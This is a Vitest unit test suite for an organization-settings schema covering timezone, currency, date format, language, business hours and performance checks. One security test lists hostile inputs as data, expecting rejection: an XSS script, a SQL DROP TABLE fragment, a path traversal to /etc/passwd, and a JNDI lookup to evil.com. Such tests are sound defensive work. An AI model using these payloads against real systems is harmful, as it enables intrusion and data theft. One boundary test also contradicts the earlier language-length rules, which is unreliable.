/**
 * Organization Settings Schema Unit Tests - 2026 Best Practices
 * 
 * Comprehensive test suite for organization settings validation without database dependencies.
 * Tests core validation logic for timezone, currency, date format, language, and business hours.
 * 
 * Requirements: 94.2, 94.3
 */

import { describe, it, expect } from 'vitest';

// Import the schemas we're testing
import { 
  updateOrganizationSettingsSchema,
  businessHoursSchema,
  uploadOrganizationLogoSchema 
} from '../../shared/schema';

describe('Organization Settings Schema Unit Tests', () => {
  describe('Timezone Validation (Requirement 94.2)', () => {
    it('should accept valid timezone formats', () => {
      const validTimezones = [
        'UTC',
        'America/New_York',
        'Europe/London',
        'Asia/Tokyo',
        'Australia/Sydney',
        'America/Los_Angeles',
        'Europe/Paris',
        'Asia/Shanghai',
        'US/Eastern',
        'US/Central',
        'GMT',
        'EST',
        'PST',
      ];

      for (const timezone of validTimezones) {
        const result = updateOrganizationSettingsSchema.safeParse({ timezone });
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid timezone formats', () => {
      const invalidTimezones = [
        '',                    // Empty
        'Invalid Timezone',    // Spaces
        'UTC+5:30',           // Special characters (not supported in this regex)
        'America\\New_York',   // Backslashes
        'America@New_York',   // Invalid character @
        'a'.repeat(51),      // Too long
      ];

      for (const timezone of invalidTimezones) {
        const result = updateOrganizationSettingsSchema.safeParse({ timezone });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues.some(issue => issue.path.includes('timezone'))).toBe(true);
        }
      }
    });

    it('should handle timezone field length constraints', () => {
      const result = updateOrganizationSettingsSchema.safeParse({ 
        timezone: 'a'.repeat(51) 
      });
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues.some(issue => 
          issue.message.includes('50 characters or less')
        )).toBe(true);
      }
    });
  });

  describe('Currency Validation (Requirement 94.2)', () => {
    it('should accept valid ISO 4217 currency codes', () => {
      const validCurrencies = [
        'USD', 'EUR', 'GBP', 'JPY', 'CAD', 'AUD', 'CHF', 'CNY',
        'SEK', 'NOK', 'DKK', 'SGD', 'HKD', 'NZD', 'ZAR', 'INR',
        'BRL', 'MXN', 'KRW', 'TRY', 'RUB', 'PLN', 'THB', 'MYR',
      ];

      for (const currency of validCurrencies) {
        const result = updateOrganizationSettingsSchema.safeParse({ currency });
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid currency codes', () => {
      const invalidCurrencies = [
        '',           // Empty
        'usd',        // Lowercase
        'Usd',        // Mixed case
        'US',         // Too short
        'USDD',       // Too long
        'USD1',       // Contains number
        'U$D',        // Special character
        ' USA',       // Leading space
        'USA ',       // Trailing space
      ];

      for (const currency of invalidCurrencies) {
        const result = updateOrganizationSettingsSchema.safeParse({ currency });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues.some(issue => issue.path.includes('currency'))).toBe(true);
        }
      }
    });
  });

  describe('Date Format Validation (Requirement 94.2)', () => {
    it('should accept supported date formats', () => {
      const validDateFormats = [
        'YYYY-MM-DD',
        'DD/MM/YYYY', 
        'MM/DD/YYYY',
        'DD-MM-YYYY',
        'MM-DD-YYYY',
        'YYYY/MM/DD',
        'DD.MM.YYYY',
        'MM.DD.YYYY',
      ];

      for (const dateFormat of validDateFormats) {
        const result = updateOrganizationSettingsSchema.safeParse({ dateFormat });
        expect(result.success).toBe(true);
      }
    });

    it('should reject unsupported date formats', () => {
      const invalidDateFormats = [
        '',              // Empty
        'MM-DD-YY',      // Wrong year format
        'DD/MM/YY',      // Wrong year format
        'YYYY/MM/DD/HH', // Contains time
        'YYYY-MM-DDTHH:MM:SS', // ISO datetime
        'MM-DD-YYYY ',   // Trailing space
        ' MM-DD-YYYY',   // Leading space
        'invalid',       // Invalid format
      ];

      for (const dateFormat of invalidDateFormats) {
        const result = updateOrganizationSettingsSchema.safeParse({ dateFormat });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues.some(issue => issue.path.includes('dateFormat'))).toBe(true);
        }
      }
    });
  });

  describe('Language Validation (Requirement 94.3)', () => {
    it('should accept valid language codes', () => {
      const validLanguages = [
        'en',
        'en-US',
        'en-GB',
        'fr',
        'fr-FR',
        'fr-CA',
        'de',
        'de-DE',
        'de-AT',
        'es',
        'es-ES',
        'es-MX',
        'it',
        'it-IT',
        'pt',
        'pt-BR',
        'pt-PT',
        'ja',
        'zh',
        'zh-CN',
        'zh-TW',
        'ko',
        'ru',
        'ar',
        'hi',
        'th',
        'vi',
      ];

      for (const language of validLanguages) {
        const result = updateOrganizationSettingsSchema.safeParse({ language });
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid language codes', () => {
      const invalidLanguages = [
        '',           // Empty
        'EN',         // Uppercase
        'En',         // Mixed case
        'EN-US',      // Uppercase
        'e',          // Too short
        'eng',        // Too long
        'en_US',      // Underscore instead of dash
        'en-US-',     // Trailing dash
        '-en-US',     // Leading dash
        'en--US',     // Double dash
        'en-USA',     // Country code too long
        'en-1',       // Number in country code
        'en-@B',      // Special character
      ];

      for (const language of invalidLanguages) {
        const result = updateOrganizationSettingsSchema.safeParse({ language });
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error.issues.some(issue => issue.path.includes('language'))).toBe(true);
        }
      }
    });
  });

  describe('Business Hours Validation (Requirement 94.3)', () => {
    it('should accept valid business hours configuration', () => {
      const validBusinessHours = {
        monday: { enabled: true, open: "09:00", close: "17:00" },
        tuesday: { enabled: true, open: "09:00", close: "17:00" },
        wednesday: { enabled: true, open: "09:00", close: "17:00" },
        thursday: { enabled: true, open: "09:00", close: "17:00" },
        friday: { enabled: true, open: "09:00", close: "17:00" },
        saturday: { enabled: false, open: "09:00", close: "17:00" },
        sunday: { enabled: false, open: "09:00", close: "17:00" },
      };

      const result = updateOrganizationSettingsSchema.safeParse({ businessHours: validBusinessHours });
      expect(result.success).toBe(true);
    });

    it('should accept various time formats', () => {
      const validTimeFormats = [
        "00:00", "01:00", "02:00", "03:00", "04:00", "05:00",
        "06:00", "07:00", "08:00", "09:00", "10:00", "11:00",
        "12:00", "13:00", "14:00", "15:00", "16:00", "17:00",
        "18:00", "19:00", "20:00", "21:00", "22:00", "23:00",
      ];

      for (const time of validTimeFormats) {
        const businessHours = {
          monday: { enabled: true, open: time, close: "23:59" },
          tuesday: { enabled: true, open: "00:00", close: time },
          wednesday: { enabled: false, open: "09:00", close: "17:00" },
          thursday: { enabled: false, open: "09:00", close: "17:00" },
          friday: { enabled: false, open: "09:00", close: "17:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        };

        const result = businessHoursSchema.safeParse(businessHours);
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid time formats', () => {
      const invalidTimeFormats = [
        "24:00",    // Invalid hour
        "25:00",    // Invalid hour
        "09:60",    // Invalid minute
        "09:61",    // Invalid minute
        "9:00",     // Single digit hour
        "09:0",     // Single digit minute
        "09:00 ",   // Trailing space
        " 09:00",   // Leading space
        "09-00",    // Wrong separator
        "09.00",    // Wrong separator
        "09:00:00", // Includes seconds
        "invalid",  // Invalid string
        "",         // Empty
      ];

      for (const time of invalidTimeFormats) {
        const businessHours = {
          monday: { enabled: true, open: time, close: "17:00" },
          tuesday: { enabled: true, open: "09:00", close: "17:00" },
          wednesday: { enabled: true, open: "09:00", close: "17:00" },
          thursday: { enabled: true, open: "09:00", close: "17:00" },
          friday: { enabled: true, open: "09:00", close: "17:00" },
          saturday: { enabled: true, open: "09:00", close: "17:00" },
          sunday: { enabled: true, open: "09:00", close: "17:00" },
        };

        const result = businessHoursSchema.safeParse(businessHours);
        expect(result.success).toBe(false);
      }
    });

    it('should reject business hours where close time is before open time', () => {
      const invalidBusinessHours = {
        monday: { enabled: true, open: "17:00", close: "09:00" }, // Close before open
        tuesday: { enabled: true, open: "09:00", close: "09:00" }, // Same time
        wednesday: { enabled: true, open: "10:00", close: "09:00" }, // Close before open
        thursday: { enabled: true, open: "09:00", close: "17:00" },
        friday: { enabled: true, open: "09:00", close: "17:00" },
        saturday: { enabled: false, open: "09:00", close: "17:00" },
        sunday: { enabled: false, open: "09:00", close: "17:00" },
      };

      const result = businessHoursSchema.safeParse(invalidBusinessHours);
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues.some(issue => 
          issue.message.includes("Close time must be after open time")
        )).toBe(true);
      }
    });

    it('should allow disabled days with any time values', () => {
      const businessHoursWithDisabledDays = {
        monday: { enabled: true, open: "09:00", close: "17:00" },
        tuesday: { enabled: false, open: "17:00", close: "09:00" }, // Invalid times but disabled
        wednesday: { enabled: false, open: "25:00", close: "09:00" }, // Invalid times but disabled
        thursday: { enabled: true, open: "09:00", close: "17:00" },
        friday: { enabled: true, open: "09:00", close: "17:00" },
        saturday: { enabled: false, open: "09:00", close: "17:00" },
        sunday: { enabled: false, open: "09:00", close: "17:00" },
      };

      const result = businessHoursSchema.safeParse(businessHoursWithDisabledDays);
      expect(result.success).toBe(true);
    });
  });

  describe('Complete Settings Validation', () => {
    it('should accept complete valid settings update', () => {
      const completeSettings = {
        timezone: 'America/New_York',
        currency: 'USD',
        dateFormat: 'MM/DD/YYYY',
        language: 'en-US',
        businessHours: {
          monday: { enabled: true, open: "09:00", close: "17:00" },
          tuesday: { enabled: true, open: "09:00", close: "17:00" },
          wednesday: { enabled: true, open: "09:00", close: "17:00" },
          thursday: { enabled: true, open: "09:00", close: "17:00" },
          friday: { enabled: true, open: "09:00", close: "17:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        },
      };

      const result = updateOrganizationSettingsSchema.safeParse(completeSettings);
      expect(result.success).toBe(true);
    });

    it('should accept partial settings updates', () => {
      const partialUpdates = [
        { timezone: 'Europe/London' },
        { currency: 'EUR' },
        { dateFormat: 'DD/MM/YYYY' },
        { language: 'fr-FR' },
        { businessHours: {
          monday: { enabled: true, open: "08:00", close: "16:00" },
          tuesday: { enabled: true, open: "08:00", close: "16:00" },
          wednesday: { enabled: true, open: "08:00", close: "16:00" },
          thursday: { enabled: true, open: "08:00", close: "16:00" },
          friday: { enabled: true, open: "08:00", close: "16:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        }},
        { timezone: 'Asia/Tokyo', currency: 'JPY' },
        { dateFormat: 'YYYY/MM/DD', language: 'ja' },
      ];

      for (const update of partialUpdates) {
        const result = updateOrganizationSettingsSchema.safeParse(update);
        expect(result.success).toBe(true);
      }
    });

    it('should reject empty settings update', () => {
      const result = updateOrganizationSettingsSchema.safeParse({});
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(result.error.issues.some(issue => 
          issue.message.includes("At least one setting field must be provided")
        )).toBe(true);
      }
    });
  });

  describe('Edge Cases and Security', () => {
    it('should handle potentially malicious inputs', () => {
      const maliciousInputs = [
        { timezone: '<script>alert("xss")</script>' },
        { currency: 'DROP TABLE users;' },
        { language: '../../../etc/passwd' },
        { dateFormat: '${jndi:ldap://evil.com/a}' },
      ];

      for (const input of maliciousInputs) {
        const result = updateOrganizationSettingsSchema.safeParse(input);
        // Schema validation should handle these appropriately
        expect(result).toBeDefined();
        expect(result.success).toBe(false);
      }
    });

    it('should validate boundary conditions', () => {
      const boundaryTests = [
        { timezone: 'a'.repeat(50), currency: 'USD' }, // Max length timezone
        { timezone: 'UTC', language: 'a'.repeat(10) }, // Max length language
        { businessHours: {
          monday: { enabled: true, open: "00:00", close: "23:59" }, // Edge times
          tuesday: { enabled: true, open: "23:58", close: "23:59" }, // Minimal difference
          wednesday: { enabled: true, open: "09:00", close: "17:00" },
          thursday: { enabled: true, open: "09:00", close: "17:00" },
          friday: { enabled: true, open: "09:00", close: "17:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        }},
      ];

      for (const test of boundaryTests) {
        const result = updateOrganizationSettingsSchema.safeParse(test);
        expect(result.success).toBe(true);
      }
    });
  });

  describe('Performance and Efficiency', () => {
    it('should handle validation efficiently', () => {
      const startTime = Date.now();
      
      // Simulate 1000 validation operations
      for (let i = 0; i < 1000; i++) {
        updateOrganizationSettingsSchema.safeParse({
          timezone: 'America/New_York',
          currency: 'USD',
          dateFormat: 'MM/DD/YYYY',
          language: 'en-US',
        });
      }

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete 1000 validations in under 1 second
      expect(duration).toBeLessThan(1000);
    });

    it('should handle business hours validation efficiently', () => {
      const startTime = Date.now();
      
      // Simulate 100 business hours validations
      for (let i = 0; i < 100; i++) {
        businessHoursSchema.safeParse({
          monday: { enabled: true, open: "09:00", close: "17:00" },
          tuesday: { enabled: true, open: "09:00", close: "17:00" },
          wednesday: { enabled: true, open: "09:00", close: "17:00" },
          thursday: { enabled: true, open: "09:00", close: "17:00" },
          friday: { enabled: true, open: "09:00", close: "17:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        });
      }

      const endTime = Date.now();
      const duration = endTime - startTime;

      // Should complete 100 business hours validations in under 500ms
      expect(duration).toBeLessThan(500);
    });
  });

  describe('Logo Upload Schema', () => {
    it('should accept logo upload schema', () => {
      const result = uploadOrganizationLogoSchema.safeParse({});
      expect(result.success).toBe(true);
    });

    it('should handle logo upload schema structure', () => {
      // The schema exists for consistency and future validation
      // File validation is handled by multer middleware
      expect(uploadOrganizationLogoSchema).toBeDefined();
    });
  });
});

describe('Organization Settings Integration Scenarios', () => {
  describe('Complete Workflows', () => {
    it('should validate complete organization setup workflow', () => {
      const organizationSetup = {
        timezone: 'America/New_York',
        currency: 'USD',
        dateFormat: 'MM/DD/YYYY',
        language: 'en-US',
        businessHours: {
          monday: { enabled: true, open: "09:00", close: "17:00" },
          tuesday: { enabled: true, open: "09:00", close: "17:00" },
          wednesday: { enabled: true, open: "09:00", close: "17:00" },
          thursday: { enabled: true, open: "09:00", close: "17:00" },
          friday: { enabled: true, open: "09:00", close: "17:00" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        },
      };

      const result = updateOrganizationSettingsSchema.safeParse(organizationSetup);
      expect(result.success).toBe(true);
    });

    it('should validate international organization setup', () => {
      const internationalSetup = {
        timezone: 'Europe/Paris',
        currency: 'EUR',
        dateFormat: 'DD/MM/YYYY',
        language: 'fr-FR',
        businessHours: {
          monday: { enabled: true, open: "08:30", close: "16:30" },
          tuesday: { enabled: true, open: "08:30", close: "16:30" },
          wednesday: { enabled: true, open: "08:30", close: "16:30" },
          thursday: { enabled: true, open: "08:30", close: "16:30" },
          friday: { enabled: true, open: "08:30", close: "16:30" },
          saturday: { enabled: false, open: "09:00", close: "17:00" },
          sunday: { enabled: false, open: "09:00", close: "17:00" },
        },
      };

      const result = updateOrganizationSettingsSchema.safeParse(internationalSetup);
      expect(result.success).toBe(true);
    });
  });

  describe('Error Handling', () => {
    it('should provide meaningful error messages', () => {
      const invalidSettings = {
        timezone: '',
        currency: 'usd',
        dateFormat: 'invalid',
        language: 'EN',
        businessHours: {
          monday: { enabled: true, open: "17:00", close: "09:00" }, // Invalid time range
        },
      };

      const result = updateOrganizationSettingsSchema.safeParse(invalidSettings);
      expect(result.success).toBe(false);

      if (!result.success) {
        expect(result.error.issues.length).toBeGreaterThan(0);
        
        const errorMessages = result.error.issues.map(issue => issue.message);
        expect(errorMessages.some(msg => 
          msg.includes('required') || 
          msg.includes('format') || 
          msg.includes('uppercase') ||
          msg.includes('Invalid')
        )).toBe(true);
      }
    });

    it('should handle concurrent validation safely', async () => {
      const concurrentValidations = Array(10).fill(null).map((_, _index) =>
        Promise.resolve(updateOrganizationSettingsSchema.safeParse({
          timezone: 'America/New_York',
          currency: 'USD',
          dateFormat: 'MM/DD/YYYY',
          language: 'en-US',
        }))
      );

      const results = await Promise.all(concurrentValidations);
      const successful = results.filter(r => r.success);
      expect(successful).toHaveLength(10);
    });
  });
});
